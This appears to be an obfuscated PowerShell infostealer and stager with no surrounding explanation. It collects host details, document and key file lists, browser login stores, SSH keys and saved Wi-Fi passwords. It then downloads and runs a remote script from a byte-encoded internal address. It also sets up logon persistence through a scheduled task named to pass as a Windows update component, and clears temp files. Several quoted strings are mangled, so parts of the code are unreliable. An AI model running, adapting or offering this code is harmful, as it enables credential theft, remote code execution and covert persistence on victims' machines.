$_hnVeujA2lj = 'OPER-4721('
$_Qm8wTgPv3K = [System.Environment]::TickCount
function _yffO1ztg8C {
    $_NtBdttNLR7 = @{
        Hostname = $env:COMPUTERNAME
        Username = $env:USERNAME
        Domain   = $env:USERDOMAIN
        OS       = (Get-WmiObject Win32_OperatingSystem).Caption
        Campaign = $_hnVeujA2lj
        Arch     = $env:PROCESSOR_ARCHITECTURE
        Ticks    = $_Qm8wTgPv3K
    }
    return ($_NtBdttNLR7 | ConvertTo-Json -Compress)
}
$_L8nVhXhD40 = _yffO1ztg8C
$_5f2Rl1sSLi = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($_L8nVhXhD40))
[IO.File]::WriteAllText("$env:TEMP\~si$(Get-Random -Maximum 9999).tmp", $_5f2Rl1sSLi)
$_Yk3bNxHm6W = @((')*.docx')), (('*.xlsx('), (')*.pdf('), (')*.pptx('), (')*.kdbx('), (')*.key('), (')*.pem('))
$_cUzSZWQydT = @()
foreach ($_Dm5rJvLp9F in @("$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\.ssh")) {
    if (Test-Path $_Dm5rJvLp9F) {
        $_cUzSZWQydT += Get-ChildItem -Path $_Dm5rJvLp9F -Recurse -Include $_Yk3bNxHm6W -ErrorAction SilentlyContinue
    }
}
$_Bw2kRfYn8H = @()
foreach ($_7qrjXL0sNq in $_cUzSZWQydT) {
    if ($_7qrjXL0sNq.Length -gt 10MB) { continue }
    $_Bw2kRfYn8H += @{
        n = $_7qrjXL0sNq.Name
        s = $_7qrjXL0sNq.Length
        p = $_7qrjXL0sNq.FullName
        h = (Get-FileHash $_7qrjXL0sNq.FullName -Algorithm MD5 -ErrorAction SilentlyContinue).Hash
    }
}
[IO.File]::WriteAllText("$env:TEMP\~mf$(Get-Random -Maximum 9999).tmp", ($_Bw2kRfYn8H | ConvertTo-Json -Compress))
$_Xp4cGwKj7V = Get-Process -ErrorAction SilentlyContinue | ForEach-Object {
    $_Tn2mJgKv5B = $null; try { $_Tn2mJgKv5B = $_.MainModule.FileName } catch {}
    $_Pw8rLcXf0D = $null; try { $_Pw8rLcXf0D = (Get-WmiObject Win32_Process -Filter "ProcessId=$($_.Id)" -EA SilentlyContinue).CommandLine } catch {}
    [PSCustomObject]@{ Name = $_.ProcessName; PID = $_.Id; Path = $_Tn2mJgKv5B; Cmd = $_Pw8rLcXf0D }
}
$_Hz6mQdNt1R = $_Xp4cGwKj7V | ConvertTo-Json -Compress
[IO.File]::WriteAllText("$env:TEMP\~pf$(Get-Random -Maximum 9999).tmp", $_Hz6mQdNt1R)
$_Kp5nLwRf7G = @()
$_Kp5nLwRf7G += Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -ErrorAction SilentlyContinue
$_Kp5nLwRf7G += Get-ChildItem "$env:APPDATA\Mozilla\Firefox\Profiles\*\logins.json" -ErrorAction SilentlyContinue
$_Kp5nLwRf7G += Get-ChildItem "$env:USERPROFILE\.ssh\id_*" -ErrorAction SilentlyContinue
$_Kp5nLwRf7G += Get-ChildItem "$env:USERPROFILE\*.kdbx" -Recurse -ErrorAction SilentlyContinue
$_Mf7sHdXn0B = @()
foreach ($_cr in $_Kp5nLwRf7G) {
    $_Mf7sHdXn0B += @{ path = $_cr.FullName; size = $_cr.Length; modified = $_cr.LastWriteTime.ToString("o(')) }
}
[IO.File]::WriteAllText('))$env:TEMP\~cf$(Get-Random -Maximum 9999).tmp", ($_Mf7sHdXn0B | ConvertTo-Json -Compress))
$_Wn3vFbYk9S = @()
try {
    $_Wn3vFbYk9S = (netsh wlan show profiles) | Select-String "All User Profile" | ForEach-Object {
        ($_ -split ":")[-1].Trim()
    }
} catch {}
if ($_Wn3vFbYk9S.Count -gt 0) {
    $_Ek5rTgWv4N = @()
    foreach ($_wf in $_Wn3vFbYk9S) {
        $_kc = $null; try { $_kc = (netsh wlan show profile name="$_wf(' key=clear) | Select-String Key Content" | ForEach-Object { ($_ -split ":")[-1].Trim() } } catch {}
        $_Ek5rTgWv4N += @{ ssid = $_wf; key = $_kc }
    }
    [IO.File]::WriteAllText("$env:TEMP\~wf$(Get-Random -Maximum 9999).tmp", ($_Ek5rTgWv4N | ConvertTo-Json -Compress))
}
$_Fg2kLnPw8Q = [byte[]](104,116,116,112,58,47,47,49,48,46,52,53,46,49,46,50,58,51,50,48,51,48)
$_Yn8vRfHk5T = [Text.Encoding]::ASCII.GetString($_Fg2kLnPw8Q)
$_Pk8vWcNm3Q = New-Object Net.WebClient
$_Pk8vWcNm3Q.Headers.Add("Accept", (')text/plain('))
Invoke-Command -ScriptBlock ([scriptblock]::Create($_Pk8vWcNm3Q.DownloadString("$_Yn8vRfHk5T/" + (')iurepwiog(') + (')dsafvfds')) + ('.ps1('))))
$_Uj8pLmCx2G = "$env:TEMP\update_service.exe"
if (Test-Path $_Uj8pLmCx2G) {
    try {
        $_Vf4kNwRm7B = New-ScheduledTaskAction -Execute $_Uj8pLmCx2G
        $_Gx9tJcPh2L = New-ScheduledTaskTrigger -AtLogOn
        Register-ScheduledTask -TaskName (')WindowsUpda')+('teAssistant') -Action $_Vf4kNwRm7B -Trigger $_Gx9tJcPh2L -ErrorAction SilentlyContinue | Out-Null
    } catch {}
}
Get-ChildItem "$env:TEMP\~df*.tmp" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue